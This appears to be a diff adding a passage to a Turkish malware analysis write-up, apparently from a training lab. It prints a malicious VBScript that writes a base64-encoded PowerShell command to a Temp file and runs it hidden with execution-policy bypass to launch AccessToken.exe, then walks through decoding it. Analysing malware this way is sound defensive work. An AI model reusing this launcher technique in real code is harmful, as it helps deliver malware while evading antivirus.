@@ -387,8 +387,28 @@ Port: 80
 
 2. Malware hangi adresler üzerinden iletişim kuruyor?
 
+İlk önce ".vbs" dosyası ile başlamak istiyorum. Dosyayı bir editör yardımı ile açtığımda içeriği aşağıdaki gibi karşılıyor beni.
+```
+Dim filesys, filetxt, getname, path
+    Set filesys = CreateObject("Scripting.FileSystemObject")
+    Set filetxt = filesys.CreateTextFile("C:\Users\RickMartinGrimes\AppData\Local\Temp\notabadpowershell.ps1", True)
+    filetxt.WriteLine ("powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFUAcwBlAHIAcwBcAFIAaQBjAGsATQBhAHIAdABpAG4ARwByAGkAbQBlAHMAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAEEAYwBjAGUAcwBzAFQAbwBrAGUAbgAuAGUAeABlAA==")
+    Set oshell = CreateObject("WScript.Shell")
+	filetxt.Close
+    oshell.Run "powershell -exec bypass C:\Users\RickMartinGrimes\AppData\Local\Temp\notabadpowershell.ps1", 0, True D
+```
 
+Base64 ile bir kodlama yapıldığını görüyorum. CyberChef ile decode ediyorum. AV Bypass için yapılan Null Byte'lardan kurtulmak gerekebiliyor.
 
+![image](https://user-images.githubusercontent.com/88983987/220226850-10caec56-fbe2-423a-a34d-356ab95f564c.png)
+
+Bu dosya çalıştırıldığında, ```"C:\Users\RickMartinGrimes\AppData\Local\Temp\"``` konumunda, ```notabadpowershell.ps1``` adında bir dosya oluşturuyor. Ardından içerisine aşağıdaki metini yerleştiriyor ve dosyayı çalıştırıyor.
+```
+Start-Process C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe
+```
+Bu bir dropper değil, sadece virüsün tetiklenmesini sağlıyor. 
+
+Sonrasında, "accesstoken.exe" uygulamasını incelemeye başlıyorum.
 
 
 
